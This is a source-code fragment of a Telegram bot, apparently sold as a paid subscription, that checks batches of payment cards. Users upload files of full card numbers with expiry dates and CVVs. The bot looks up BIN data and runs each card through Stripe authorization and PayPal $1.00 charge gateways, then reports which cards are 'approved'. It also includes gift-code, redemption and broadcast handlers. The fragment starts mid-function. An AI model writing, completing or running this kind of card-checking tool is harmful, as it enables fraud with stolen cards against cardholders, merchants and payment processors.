[<a href='t.me/o8380'>ϟ</a>] Username: {username}
[<a href='t.me/o8380'>ϟ</a>] User ID: <code>{user_id}</code>
[<a href='t.me/o8380'>ϟ</a>] Plan: {duration}
[<a href='t.me/o8380'>ϟ</a>] Gift Code: <code>{code}</code>
[<a href='t.me/o8380'>ϟ</a>] Expiry: {expiry_str}
[<a href='t.me/o8380'>ϟ</a>] Date: {current_time}
[<a href='t.me/o8380'>ϟ</a>] Type: Gift Code
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] BOT: @MustafaChkBot <tg-emoji emoji-id='5283232570660634549'>🪙</tg-emoji>
━━━━━━━━━━━━━━━━━━━
</b>"""
            bot.send_message(OWNER_ID, developer_receipt, parse_mode="HTML")

    except Exception as e:
        logger.error(f"Error in successful payment: {e}")
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

# ==================== START THE BOT ====================
import json
import string
import random
from datetime import datetime, timedelta
import threading
import telebot
from telebot import types
import os
# Define admin ID
admin = 1013384909

# Function to read data
def read_data():
    try:
        # التحقق من وجود الملف
        if not os.path.exists('data.json'):
            return {}
            
        # قراءة الملف
        with open('data.json', 'r', encoding='utf-8') as json_file:
            content = json_file.read().strip()
            # إذا كان الملف فارغاً، أرجع قاموساً فارغاً
            if not content:
                return {}
            return json.loads(content)
    except json.JSONDecodeError:
        # إذا كان الملف يحتوي على JSON غير صالح، أرجع قاموساً فارغاً
        return {}
    except FileNotFoundError:
        return {}

# Function to write data
def write_data(data):
    with open('data.json', 'w', encoding='utf-8') as json_file:
        json.dump(data, json_file, ensure_ascii=False, indent=4)

@bot.message_handler(commands=["Mustafa"])
def code(message):
    def my_function():
        try:
            # الادمن هو المستخدم أن من التحقق
            user_id = message.from_user.id
            if str(user_id) != "1013384909":
                bot.reply_to(message, "⛔ This command is for admins only")
                return

            # الإجراء وفصل النص على الحصول
            text = message.text.strip()
            parts = text.split()

            # معامل وجود من التحقق
            if len(parts) != 2:
                bot.reply_to(message, "❌ Please use the command correctly:\n/Mustafa [number of hours]\nExample: /Mustafa 24")
                return

            # رقم إلى المعامل تحويل محاولة
            try:
                h = float(parts[1])
            except ValueError:
                bot.reply_to(message, "❌ Please enter a valid number of hours (e.g., 24)")
                return
            
            # التحقق من أن الرقم موجب
            if h <= 0:
                bot.reply_to(message, "❌ Please enter a positive number of hours")
                return
            
            # Read existing data
            existing_data = read_data()
            
            # تأكد أن existing_data هو قاموس
            if not isinstance(existing_data, dict):
                existing_data = {}

            # Create random code
            characters = string.ascii_uppercase + string.digits  
            pas = 'Mustafa-' + ''.join(random.choices(characters, k=4)) + '-' + \
                  ''.join(random.choices(characters, k=4)) + '-' + \
                  ''.join(random.choices(characters, k=4))  
                
            Mustafax = datetime.now()  
            ig = Mustafax + timedelta(hours=h)  
            plan = 'vip'  
                
            # Format expiry time  
            expiry_str = ig.strftime("%Y-%m-%d %H:%M")  
                
            # Add new data  
            new_data = {  
                pas: {  
                    "plan": plan,  
                    "time": expiry_str,  
                }  
            }  
                
            existing_data.update(new_data)  
                
            # Save data
            write_data(existing_data)  
                
            msg = f'''<b>
<tg-emoji emoji-id='5866251720845168552'>🆕</tg-emoji> Payment Done Successfully
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] - This Is The Code
You Can Redeem It Or Send It as a gift to your friend
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] - Status - VIP
[<a href='t.me/o8380'>ϟ</a>] - Expires at - {expiry_str}
[<a href='t.me/o8380'>ϟ</a>] - 𝙿𝚛𝚘𝚐𝚛𝚊𝚖𝚖𝚎𝚛 𝚂𝚘𝚗𝚜 -『@o8380』
[<a href='t.me/o8380'>ϟ</a>] - Code - <code>{pas}</code>	
[<a href='t.me/o8380'>ϟ</a>] - Usage - /redeem [Code]
[<a href='t.me/o8380'>ϟ</a>] - BOT: @MustafaChkBot <tg-emoji emoji-id='5283232570660634549'>🪙</tg-emoji>
━━━━━━━━━━━━━━━━━━━
</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")

        except Exception as e:  
            print('ERROR:', str(e))  
            bot.reply_to(message, f"❌ Error: {str(e)}")  
    
    my_thread = threading.Thread(target=my_function)  
    my_thread.start()


    
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    try:
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Please provide a code. Usage: /redeem CODE")
            return

        code = message.text.split()[1]  
        data = read_data()  
        
        if code not in data:  
            bot.reply_to(message, "Incorrect code or it has already been redeemed")  
            return  
            
        code_data = data[code]  
        user_id = str(message.from_user.id)  
        
        # Update user data  
        if user_id not in data:  
            data[user_id] = {}  
            
        data[user_id]['timer'] = code_data['time']  
        data[user_id]['plan'] = code_data['plan']  
        
        # Remove the used code  
        del data[code]  
        write_data(data)  
        
        msg = f'''<b>- Your subscription has been successfully activated ❇️
        
[<a href='t.me/o8380'>ϟ</a>] Expiry: {code_data['time']}
[<a href='t.me/o8380'>ϟ</a>] Plan: {code_data['plan']}
- Bot By :> <a href='t.me/o8380'>- 𝙿𝚛𝚘𝚐𝚛𝚊𝚖𝚖𝚎𝚛 𝚂𝚘𝚗𝚜</a></b>'''
        bot.reply_to(message, msg, parse_mode="HTML")

    except Exception as e:  
        bot.reply_to(message, f"An error occurred: {str(e)}")




@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """إرسال رسالة جماعية للمستخدمين المسجلين"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "⚠️ This command is for owner only.")
        return

    try:  
        msg = message.text.split('/broadcast', 1)[1].strip()  
        if not msg:  
            bot.reply_to(message, "⚠️ Please provide a message to broadcast.")  
            return  
        
        bot.reply_to(message, "📢 Starting broadcast...")  
        success = 0  
        failed = 0  
        
        with open('users.txt', 'r', encoding='utf-8') as f:  
            for line in f:  
                try:  
                    user_id = line.split('&')[0]  
                    bot.send_message(user_id, msg)  
                    success += 1  
                except Exception as e:  
                    failed += 1  
                    logger.error(f"Failed to send to {user_id}: {e}")  
        
        bot.reply_to(message, f"📊 Broadcast Results:\nSuccess: {success}\nFailed: {failed}")  
    except Exception as e:  
        logger.error(f"Error in broadcast command: {e}")  
        bot.reply_to(message, "⚠️ Error processing broadcast command.")

# معالجات ردود الcallback
@bot.callback_query_handler(func=lambda call: call.data == "register")
def register_callback(call):
    """معالجة زر التسجيل من لوحة المفاتيح"""
    try:
        if is_user_registered(call.from_user.id):
            bot.answer_callback_query(call.id, susmsg, show_alert=True)
            return

        if register_user_in_txt(call.from_user):  
            bot.answer_callback_query(call.id, clcmsg, show_alert=True)  
            
            # تحديث الرسالة لإزالة زر التسجيل  
            try:  
                edit_message_safe(  
                    call.message.chat.id,  
                    call.message.message_id,  
                    call.message.caption,  
                    reply_markup=create_main_menu_keyboard(call.from_user.id),  
                    parse_mode="HTML"  
                )  
            except Exception as e:  
                logger.error(f"Error updating message after registration: {e}")  
            
            # إرسال إشعار للمطور  
            try:  
                users_data = load_users()
                user_num = users_data.get(str(call.from_user.id), {}).get('user_number', 'Unknown')
                
                bot.send_message(  
                    OWNER_ID,  
                    f"📝 New Registration:\n"  
                    f"👤 Name: {call.from_user.first_name} {call.from_user.last_name or ''}\n"  
                    f"🆔 ID: {call.from_user.id}\n"  
                    f"📧 Username: @{call.from_user.username or 'None'}\n"  
                    f"🆔 User Number: #{user_num}"  
                )  
            except Exception as e:  
                logger.error(f"Error sending registration notification: {e}")  
        else:  
            bot.answer_callback_query(call.id, "⚠️ Registration failed. Please try again later.", show_alert=True)  
    except Exception as e:  
        logger.error(f"Error in register callback: {e}")  
        bot.answer_callback_query(call.id, "⚠️ An error occurred during registration.", show_alert=True)






# ============== Checker Mustafa ================ #
import json
import time
import requests
import threading
import os
import re
import math
from datetime import datetime, timedelta
from telebot import types
import telebot

# Import gateways
from stripe import st1
from paypal import paypal_custom1, paypal_custom2

# ==================== CONFIGURATION ====================
MAX_LINES = 1000
# Global variables for each gateway - per user
stop_paypal = {}  # {user_id: stop_flag}
stop_stripe_charge = {}
stop_stripe_auth = {}
# User-specific file processing
user_files = {}  # {user_id: filename}
user_active_checks = {}  # {user_id: {'gate': gate_name, 'active': bool}}
user_locks = {}  # {user_id: threading.Lock()}

# ==================== HELPER FUNCTIONS ====================

def get_user_lock(user_id):
    """Get or create a lock for a specific user"""
    if user_id not in user_locks:
        user_locks[user_id] = threading.Lock()
    return user_locks[user_id]

def check_subscription(user_id):
    """Check user subscription status"""
    try:
        # Try reading file with UTF-8 encoding
        with open('data.json', 'r', encoding='utf-8') as file:
            json_data = json.load(file)
    except FileNotFoundError:
        print("File data.json not found")
        return False
    except json.JSONDecodeError as e:
        print(f"JSON format error: {e}")
        return False
    except UnicodeDecodeError as e:
        print(f"File encoding error: {e}")
        # Alternative attempt with different encoding
        try:
            with open('data.json', 'r', encoding='latin-1') as file:
                json_data = json.load(file)
        except Exception as e2:
            print(f"Alternative attempt failed: {e2}")
            return False
    
    if str(user_id) not in json_data:
        return False
    
    user_data = json_data[str(user_id)]
    
    if user_data.get('plan') == 'FREE':
        return False
    
    try:
        date_str = user_data['timer'].split('.')[0]
        provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
        current_time = datetime.now()
        
        if current_time > provided_time:
            json_data[str(user_id)]['timer'] = 'none'
            json_data[str(user_id)]['plan'] = 'FREE'
            # Save file with same encoding
            with open('data.json', 'w', encoding='utf-8') as file:
                json.dump(json_data, file, indent=2, ensure_ascii=False)
            return False
        return True
    except (ValueError, KeyError) as e:
        print(f"Error processing date: {e}")
        return False

def send_subscription_message(chat_id):
    """Send subscription message to non-subscribed users"""
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    contact_button = types.InlineKeyboardButton(
        text="𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐀𝐝𝐦𝐢𝐧", 
        url="https://t.me/o8380",
        icon_custom_emoji_id="5060298809943262023",
        style="primary"
    )
    keyboard.add(contact_button)
    
    try:
        bot.send_message(
            chat_id=chat_id,
            text='''━━━━━━━━━━━━━━━━━━
𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐜𝐞𝐬𝐬 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝

You don't have an active subscription!

𝐓𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭, 𝐲𝐨𝐮 𝐧𝐞𝐞𝐝:
• Premium access
• Valid subscription plan

━━━━━━━━━━━━━━━━━━
𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨:
• Purchase subscription
• Get more information
• Report any issues
━━━━━━━━━━━━━━━━━━
𝐁𝐨𝐭 𝐁𝐲: @o8380''',
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Error sending message: {e}")

def validate_cc_format(cc):
    """Validate credit card format"""
    try:
        pattern = r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
        if re.match(pattern, cc.strip()):
            return True
        return False
    except:
        return False

def get_bin_info(bin_number):
    """Get BIN information"""
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
        if response.status_code == 200:
            api_url = response.json()
            return (
                api_url.get("bank", "Unknown"),
                api_url.get("country_name", "Unknown"),
                api_url.get("country_flag", "🏳️"),
                api_url.get("brand", "Unknown"),
                api_url.get("type", "Unknown"),
                api_url.get("level", "Unknown")
            )
        return ("Unknown", "Unknown", "🏳️", "Unknown", "Unknown", "Unknown")
    except Exception as e:
        return ("Unknown", "Unknown", "🏳️", "Unknown", "Unknown", "Unknown")

def get_bin_display(bin_number):
    """Display BIN information in beautiful format"""
    try:
        bank, country, flag, brand, card_type, level = get_bin_info(bin_number)
        return (f'[<a href="https://t.me/o8380">⌬</a>] Bin ➺ <code>{brand} - {card_type} - {level}</code>\n'
                f'[<a href="https://t.me/o8380">⌬</a>] Bank ➺ <code>{bank}</code>\n'
                f'[<a href="https://t.me/o8380">⌬</a>] Country ➺ <code>{country} {flag}</code>')
    except Exception as e:
        return f'[<a href="https://t.me/o8380">⌬</a>] Bin Info ➺ Not Available'

def get_user_filename(user_id):
    """Get unique filename for user"""
    return f"user_{user_id}_combo.txt"

def save_user_file(user_id, content):
    """Save file for specific user"""
    filename = get_user_filename(user_id)
    with open(filename, "wb") as w:
        w.write(content)
    user_files[user_id] = filename
    return filename

def get_user_file(user_id):
    """Get user's file path"""
    return user_files.get(user_id)

def delete_user_file(user_id):
    """Delete user's file"""
    filename = user_files.get(user_id)
    if filename and os.path.exists(filename):
        try:
            os.remove(filename)
        except:
            pass
    if user_id in user_files:
        del user_files[user_id]

def can_user_check(user_id):
    """Check if user can start a new check"""
    if user_id in user_active_checks and user_active_checks[user_id].get('active', False):
        return False, "You already have an active check. Please stop it first or wait for it to finish."
    return True, None

def set_user_check_active(user_id, gate_name, active):
    """Set user check active status"""
    if active:
        user_active_checks[user_id] = {'gate': gate_name, 'active': True}
    else:
        if user_id in user_active_checks:
            del user_active_checks[user_id]

def split_file_into_chunks(filename, chunk_size=1000):
    """Split file into chunks of specified size"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        
        total_lines = len(lines)
        num_chunks = math.ceil(total_lines / chunk_size)
        chunk_files = []
        
        for i in range(num_chunks):
            start_idx = i * chunk_size
            end_idx = min((i + 1) * chunk_size, total_lines)
            chunk_lines = lines[start_idx:end_idx]
            
            chunk_filename = f"combo_part_{i+1}_of_{num_chunks}.txt"
            with open(chunk_filename, 'w', encoding='utf-8') as chunk_file:
                chunk_file.writelines(chunk_lines)
            
            chunk_files.append((chunk_filename, len(chunk_lines), i+1, num_chunks))
        
        return chunk_files, total_lines
    except Exception as e:
        print(f"Error splitting file: {e}")
        return [], 0

def dato(bin_number):
    """Helper function for BIN info (used in the code)"""
    return get_bin_display(bin_number)

# ==================== FILE HANDLING ====================

@bot.message_handler(content_types=["document"])
def main_document_handler(message):
    """Handle document uploads - each user has their own file"""
    user_id = message.from_user.id
    
    # Check subscription
    if not check_subscription(user_id):
        send_subscription_message(message.chat.id)
        return
    
    # Check file extension
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Only .txt files are allowed!")
        return
    
    # Check if user has active check
    can_check, error_msg = can_user_check(user_id)
    if not can_check:
        bot.reply_to(message, f"❌ {error_msg}")
        return
    
    bot.send_chat_action(message.chat.id, 'typing')
    
    try:
        # Download file
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Delete old user file if exists
        delete_user_file(user_id)
        
        # Save new user file
        filename = save_user_file(user_id, downloaded_file)
        
        # Validate cards
        valid_lines = 0
        invalid_lines = 0
        with open(filename, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            total_lines = len(lines)
            
            for line in lines:
                if validate_cc_format(line.strip()):
                    valid_lines += 1
                else:
                    invalid_lines += 1
        
        if valid_lines == 0:
            bot.reply_to(message, "❌ No valid cards found in file")
            delete_user_file(user_id)
            return
        
        # Check if file exceeds limit
        if total_lines > MAX_LINES:
            bot.reply_to(message, f"⚠️ File exceeds {MAX_LINES} cards. Splitting into parts...")
            chunk_files, total = split_file_into_chunks(filename, MAX_LINES)
            
            for chunk_file, chunk_size, part_num, total_parts in chunk_files:
                with open(chunk_file, 'rb') as file:
                    bot.send_document(
                        message.chat.id,
                        file,
                        caption=f'''━━━━━━━━━━━━━━━━━━
📁 𝐏𝐚𝐫𝐭 {part_num}/{total_parts}
━━━━━━━━━━━━━━━━━━
📊 𝐂𝐚𝐫𝐝𝐬: {chunk_size}
━━━━━━━━━━━━━━━━━━
💫 @o8380'''
                    )
                os.remove(chunk_file)
            
            bot.send_message(
                message.chat.id,
                f'''━━━━━━━━━━━━━━━━━━
✅ 𝐅𝐢𝐥𝐞 𝐒𝐩𝐥𝐢𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞
━━━━━━━━━━━━━━━━━━
📊 𝐓𝐨𝐭𝐚𝐥: {total} cards
📁 𝐏𝐚𝐫𝐭𝐬: {len(chunk_files)}
━━━━━━━━━━━━━━━━━━
📌 Please upload one part to check
━━━━━━━━━━━━━━━━━━'''
            )
            delete_user_file(user_id)
            return
        
        # Send combined message with file info and gateway menu
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        charge_btn = types.InlineKeyboardButton(text="𝐂𝐡𝐚𝐫𝐠𝐞", callback_data='charge_menu', style='success', icon_custom_emoji_id='5330274810582827128')
        auth_btn = types.InlineKeyboardButton(text="𝐀𝐮𝐭𝐡", callback_data='auth_menu', style='primary', icon_custom_emoji_id='5330412803587080658')
        keyboard.add(charge_btn, auth_btn)
        
        combined_msg = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲
━━━━━━━━━━━━━━━━━━
📊 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: {total_lines}
✅ 𝐕𝐚𝐥𝐢𝐝: {valid_lines}
❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝: {invalid_lines}
━━━━━━━━━━━━━━━━━━
𝐂𝐡𝐨𝐨𝐬𝐞 𝐠𝐚𝐭𝐞𝐰𝐚𝐲 𝐭𝐲𝐩𝐞:
━━━━━━━━━━━━━━━━━━
💰 𝐂𝐡𝐚𝐫𝐠𝐞 - For charging cards
🔑 𝐀𝐮𝐭𝐡 - For authorization
🔍 𝐋𝐨𝐨𝐤𝐮𝐩 - For BIN lookup
━━━━━━━━━━━━━━━━━━
💫 𝐁𝐨𝐭 𝐁𝐲: @o8380'''
        
        bot.send_message(message.chat.id, combined_msg, reply_markup=keyboard)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        delete_user_file(user_id)

# ==================== MENU HANDLERS ====================

@bot.callback_query_handler(func=lambda call: call.data == 'charge_menu')
def charge_menu_callback(call):
    """Charge menu handler"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    paypal_btn = types.InlineKeyboardButton(
        text="𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎", 
        callback_data='paypal',
        style='primary',
        icon_custom_emoji_id='5060298809943262023'
    )
    back_btn = types.InlineKeyboardButton(
        text="𝐁𝐚𝐜𝐤", 
        callback_data='back_to_main',
        style='danger',
        icon_custom_emoji_id='5060247798616687432'
        
    )  
    keyboard.add(paypal_btn)
    keyboard.add(back_btn)
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='''━━━━━━━━━━━━━━━━━━
𝐂𝐡𝐚𝐫𝐠𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬
━━━━━━━━━━━━━━━━━━
𝐒𝐞𝐥𝐞𝐜𝐭 𝐚 𝐠𝐚𝐭𝐞𝐰𝐚𝐲 𝐭𝐨 𝐩𝐫𝐨𝐜𝐞𝐞𝐝:
━━━━━━━━━━━━━━━━━━''',
            reply_markup=keyboard
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'auth_menu')
def auth_menu_callback(call):
    """Auth menu handler"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    stripe_auth_btn = types.InlineKeyboardButton(
        text="𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡", 
        callback_data='StripeAuth',
        style='primary',
        icon_custom_emoji_id='5330274810582827128'
    )
    back_btn = types.InlineKeyboardButton(
        text="𝐁𝐚𝐜𝐤", 
        callback_data='back_to_main',
        style='danger',
        icon_custom_emoji_id="5060247798616687432"
        
    )
    
    keyboard.add(stripe_auth_btn)
    keyboard.add(back_btn)
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='''━━━━━━━━━━━━━━━━━━
🔑 𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬
━━━━━━━━━━━━━━━━━━
𝐒𝐞𝐥𝐞𝐜𝐭 𝐚 𝐠𝐚𝐭𝐞𝐰𝐚𝐲 𝐭𝐨 𝐩𝐫𝐨𝐜𝐞𝐞𝐝:
━━━━━━━━━━━━━━━━━━''',
            reply_markup=keyboard
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'back_to_main')
def back_to_main_callback(call):
    """Back to main menu"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    charge_btn = types.InlineKeyboardButton(
        text="𝐂𝐡𝐚𝐫𝐠𝐞", 
        callback_data='charge_menu',
        style='success',
        icon_custom_emoji_id='5330274810582827128'
    )
    auth_btn = types.InlineKeyboardButton(
        text="𝐀𝐮𝐭𝐡", 
        callback_data='auth_menu',
        style='primary',
        icon_custom_emoji_id='5330412803587080658'
    )
    
    keyboard.add(charge_btn, auth_btn)
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐨𝐨𝐬𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐓𝐲𝐩𝐞:
━━━━━━━━━━━━━━━━━━
💰 𝐂𝐡𝐚𝐫𝐠𝐞 - For charging cards
🔑 𝐀𝐮𝐭𝐡 - For authorization
🔍 𝐋𝐨𝐨𝐤𝐮𝐩 - For BIN lookup
━━━━━━━━━━━━━━━━━━''',
            reply_markup=keyboard
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'ignore')
def ignore_callback(call):
    """Ignore button handler"""
    bot.answer_callback_query(call.id, text="", show_alert=False)

# ==================== STOP HANDLERS WITH FAST RESPONSE ====================

@bot.callback_query_handler(func=lambda call: call.data == 'stop_paypal')
def stop_paypal_handler(call):
    user_id = str(call.from_user.id)
    if user_id in stop_paypal:
        stop_paypal[user_id] = True
        bot.answer_callback_query(call.id, "🛑 Stopping PayPal check...")


@bot.callback_query_handler(func=lambda call: call.data == 'stop_stripe_auth')
def stop_stripe_auth_handler(call):
    user_id = str(call.from_user.id)
    if user_id in stop_stripe_auth:
        stop_stripe_auth[user_id] = True
        bot.answer_callback_query(call.id, "🛑 Stopping Stripe Auth check...")

        
        



@bot.callback_query_handler(func=lambda call: call.data == 'StripeAuth')
def stripe_auth_callback(call):
    """Stripe Auth handler - Each user has their own check"""
    gate_name = '𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡'
    user_id = str(call.from_user.id)
    
    if not check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Premium access required!")
        send_subscription_message(call.message.chat.id)
        return
    
    # Check if user has file
    filename = get_user_file(call.from_user.id)
    if not filename or not os.path.exists(filename):
        bot.send_message(call.message.chat.id, "❌ No file found. Please upload a file first.")
        return
    
    # Check if user can start check
    can_check, error_msg = can_user_check(call.from_user.id)
    if not can_check:
        bot.answer_callback_query(call.id, f"❌ {error_msg}")
        return
    
    # Set user check active
    set_user_check_active(call.from_user.id, gate_name, True)

    def stripe_auth_function():
        user = call.from_user
        
        stop_stripe_auth[user_id] = False
        
        stats = {'approved': 0, 'declined': 0, 'total': 0}
        
        gates = [
            {'name': '𝐆𝐚𝐭𝐞 𝟏', 'function': st1}
        ]
        
        # Read cards from user's file
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                cards = [line.strip() for line in file if line.strip()]
                stats['total'] = len(cards)
        except:
            bot.send_message(call.message.chat.id, "❌ Error reading file")
            set_user_check_active(call.from_user.id, gate_name, False)
            return
        
        # Progress message
        markup = types.InlineKeyboardMarkup(row_width=1)
        stop_button = types.InlineKeyboardButton("⏹ 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤", callback_data='stop_stripe_auth', style='danger')
        markup.add(stop_button)
        
        welcome_text = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐂𝐚𝐫𝐝𝐬...
━━━━━━━━━━━━━━━━━━
⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_name}
━━━━━━━━━━━━━━━━━━
💫 𝐁𝐨𝐭 𝐁𝐲: @o8380'''
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=welcome_text,
                reply_markup=markup
            )
        except:
            pass
        
        gate_cycle = 0
        processed = 0
        
        for cc in cards:
            if stop_stripe_auth.get(user_id, False):
                break
            
            processed += 1
            selected_gate = gates[gate_cycle % len(gates)]
            gate_cycle += 1
            
            start_time = time.time()
            bin_number = cc[:6]
            bin_info = get_bin_display(bin_number)
            
            try:
                response = str(selected_gate['function'](cc))
            except:
                response = "ERROR"
            
            response_lower = response.lower()
            
            is_approved = False
            status_display = "Unknown"
            
            if any(key in response_lower for key in ['approved', 'success', 'insufficient', 'otp']):
                stats['approved'] += 1
                is_approved = True
                status_display = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            else:
                stats['declined'] += 1
                status_display = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            
            # Update progress
            progress_markup = types.InlineKeyboardMarkup(row_width=1)
            
            card_btn = types.InlineKeyboardButton(f"Card: {cc[:16]}...", callback_data='ignore', style='primary')
            gate_btn = types.InlineKeyboardButton(f"🚪 Gate: {selected_gate['name']}", callback_data='ignore', style='primary')
            response_btn = types.InlineKeyboardButton(f"📝 Response: {response[:30]}...", callback_data='ignore', style='primary')
            status_btn = types.InlineKeyboardButton(f"📊 Status: {status_display}", callback_data='ignore', style='primary')
            approved_btn = types.InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data='ignore', style='success')
            declined_btn = types.InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data='ignore', style='danger')
            progress_btn = types.InlineKeyboardButton(f"📈 Progress: {processed}/{stats['total']}", callback_data='ignore', style='primary')
            stop_btn = types.InlineKeyboardButton("⏹ Stop Check", callback_data='stop_stripe_auth', style='danger')
            
            progress_markup.add(card_btn, gate_btn, response_btn, status_btn, approved_btn, declined_btn, progress_btn, stop_btn)
            
            progress_text = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠: {gate_name}
━━━━━━━━━━━━━━━━━━
🔄 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {processed}/{stats['total']}
🎯 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐆𝐚𝐭𝐞: {selected_gate['name']}
━━━━━━━━━━━━━━━━━━
📈 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
📉 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
━━━━━━━━━━━━━━━━━━
𝐂𝐚𝐫𝐝: {cc}
📝 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response[:100]}...
━━━━━━━━━━━━━━━━━━'''
            
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=progress_text,
                    reply_markup=progress_markup
                )
            except:
                pass
            
            if is_approved:
                approved_msg = f'''<b>
#𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <tg-emoji emoji-id='5990239596955308193'>🔥</tg-emoji>
━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>⌬</a>] 𝐂𝐚𝐫𝐝 ➺ <code>{cc}</code>
[<a href='t.me/o8380'>⌬</a>] 𝐆𝐚𝐭𝐞 ➺ {gate_name}
[<a href='t.me/o8380'>⌬</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response[:150]}
[<a href='t.me/o8380'>⌬</a>] 𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_display}
━━━━━━━━━━━━━━━━━━
{dato(cc[:6])}
━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>⌬</a>] 𝐒𝐮𝐛-𝐆𝐚𝐭𝐞 ➺ {selected_gate['name']}
[<a href='t.me/o8380'>⌬</a>] 𝐓𝐢𝐦𝐞 ➺ {"{:.1f}".format(time.time() - start_time)}𝐬
[<a href='t.me/o8380'>⌬</a>] 𝐁𝐨𝐭 𝐁𝐲 ➺ <a href='t.me/o8380'>𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐞𝐫𝐘𝐚𝐬𝐬𝐢𝐧</a></b>'''
                
                try:
                    bot.send_message(call.from_user.id, approved_msg, parse_mode="HTML")
                except:
                    pass
            
            if stop_stripe_auth.get(user_id, False):
                break
            
            time.sleep(5)
        
        # Final message
        if stop_stripe_auth.get(user_id, False):
            final_text = f'''━━━━━━━━━━━━━━━━━━
🛑 𝐂𝐡𝐞𝐜𝐤 𝐒𝐭𝐨𝐩𝐩𝐞𝐝
━━━━━━━━━━━━━━━━━━
📊 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_name}
📈 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
📉 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
━━━━━━━━━━━━━━━━━━'''
        else:
            final_text = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝
━━━━━━━━━━━━━━━━━━
📊 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_name}
